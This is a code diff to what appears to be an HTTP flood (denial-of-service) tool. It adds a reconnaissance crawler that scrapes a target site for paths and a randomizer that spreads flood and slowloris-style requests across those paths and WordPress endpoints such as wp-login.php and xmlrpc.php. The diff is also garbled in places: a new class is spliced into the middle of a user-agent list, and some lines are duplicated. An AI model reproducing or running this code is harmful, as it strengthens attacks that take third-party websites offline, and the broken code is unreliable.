@@ -180,8 +180,42 @@ search_engine_agents = [
     "YandexImages/3.0 (+http://yandex.com/bots)",
     "YandexVideo/3.0 (+http://yandex.com/bots)",
     "YandexNews/3.0 (+http://yandex.com/bots)",
+]
 
-    # ---------------- Baidu ----------------
+class Tools:
+    @staticmethod
+    def crawl(url_str):
+        # [NEW] Active Reconnaissance - Scrape for Real Paths
+        try:
+            from urllib.parse import urlparse
+            import urllib.request
+            import re
+            
+            p = urlparse(url_str)
+            base = f"{p.scheme}://{p.netloc}"
+            
+            # Simple GET request
+            req = urllib.request.Request(url_str, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=5) as response:
+                html = response.read().decode('utf-8', errors='ignore')
+                
+            # Regex to find hrefs
+            links = re.findall(r'href=["\'](/?.*?)["\']', html)
+            valid_paths = []
+            for link in links:
+                if link.startswith('http'):
+                    if p.netloc in link: # Internal full URL
+                        valid_paths.append(link.replace(base, ""))
+                elif link.startswith('/'): # Relative Path
+                    valid_paths.append(link)
+            
+            # Unique Only
+            return list(set(valid_paths))
+        except Exception:
+            return []
+
+    @staticmethod
+    def human_format(num: int, ending: str = "B") -> str:
     "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
     "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
     "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
@@ -809,9 +843,17 @@ class HttpFlood(Thread):
         self._synevent = synevent
         self._rpc = rpc
         self._method = method
+        self._method = method
         self._target = target
         self._host = host
         self._raw_target = (self._host, (self._target.port or 80))
+        
+        # [NEW] Crawler Integration placeholder
+        self.crawled_paths = []
+        
+        # [NEW] Crawler Integration placeholder
+        # The main loop will inject crawled_paths into the class instance if found
+        self.crawled_paths = []
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
             self._raw_target = (self._host, (self._target.port or 80))
@@ -975,6 +1017,30 @@ class HttpFlood(Thread):
         for key, value in self.methods.items():
             if name == key:
                 self.SENT_FLOOD = value
+
+    def get_random_target_path(self) -> str:
+        # [NEW] Dynamic Path Randomizer (Chaos Theory)
+        choice_roll = randint(0, 100)
+        
+        # Option A: Real Crawled Paths (If available)
+        if hasattr(self, 'crawled_paths') and self.crawled_paths and choice_roll < 60:
+            return randchoice(self.crawled_paths)
+            
+        # Option B: Common WP Paths
+        if choice_roll < 80:
+            common_wp = [
+                "/",
+                "/wp-login.php",
+                "/wp-admin/admin-ajax.php",
+                "/xmlrpc.php",
+                "/feed/",
+                "/comments/feed/",
+                "/?s=" + ProxyTools.Random.rand_str(5)
+            ]
+            return randchoice(common_wp)
+            
+        # Option C: Original Target
+        return self._target.raw_path_qs
                 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
@@ -1437,11 +1503,11 @@ class HttpFlood(Thread):
         # Ideally keeps the socket open forever.
         
         # 1. Partial Payload (No double \r\n at end)
-        # 1. Partial Payload (No double \r\n at end)
         ua = randchoice(self._useragents)
         headers = self.build_consistent_headers(ua)
+        path = self.get_random_target_path()
         
-        partial_payload = (f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
+        partial_payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
                            f"Host: {self._target.authority}\r\n"
                            f"User-Agent: {ua}\r\n"
                            f"{headers}"
@@ -1484,8 +1550,14 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
              for _ in range(self._rpc):
-                # Generate Random Search Query per Request
+                 # Generate Random Search Query per Request
                 search_query = ProxyTools.Random.rand_str(randint(5, 15))
+                # WP_SEARCH is specific, so we might force it, OR mix it.
+                # But typically WP_SEARCH is for search. Let's keep it specific but use path helper if needed.
+                # Actually WP_SEARCH logic is specific to ?s= so we keep it independent of get_random_target_path 
+                # to ensure it hits the search function.
+                
+                # However, let's inject randomized headers
                 full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
                 ua = randchoice(self._useragents)
                 headers = self.build_consistent_headers(ua)
@@ -2008,11 +2080,23 @@ if __name__ == '__main__':
                 if rpc > 100:
                     logger.warning(
                         "RPC (Request Pre Connection) is higher than 100")
+                
+                # [NEW] Active Reconnaissance Phase
+                logger.info(f"{bcolors.OKCYAN}Active Recon: Crawling target for valid paths...{bcolors.RESET}")
+                discovered_paths = Tools.crawl(urlraw)
+                
+                if discovered_paths:
+                   logger.info(f"{bcolors.OKGREEN}Recon Success! Found {len(discovered_paths)} unique paths.{bcolors.RESET}")
+                else:
+                   logger.warning(f"{bcolors.WARNING}Recon: No paths found or crawl blocked. Falling back to simple paths.{bcolors.RESET}")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
-                    HttpFlood(thread_id, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
+                    flood = HttpFlood(thread_id, url, host, method, rpc, event,
+                                      uagents, referers, proxies)
+                    # Inject crawled paths
+                    flood.crawled_paths = discovered_paths
+                    flood.start()
 
             if method in Methods.LAYER4_METHODS:
                 target = URL(urlraw)
